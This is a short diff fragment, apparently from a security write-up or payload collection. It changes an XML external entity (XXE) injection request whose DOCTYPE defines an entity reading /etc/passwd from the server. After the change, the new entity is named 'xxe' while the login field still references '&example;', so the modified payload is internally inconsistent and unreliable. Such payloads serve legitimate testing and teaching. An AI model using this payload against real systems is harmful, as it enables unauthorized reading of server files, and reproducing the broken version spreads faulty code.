@@ -9,7 +9,8 @@ ORIGINAL REQUEST:
 
 MODIFIED REQUEST:
 <!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+<!DOCTYPE foo [  
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <reset>
     <login>&example;</login>
     <secret>Any bugs?</secret>
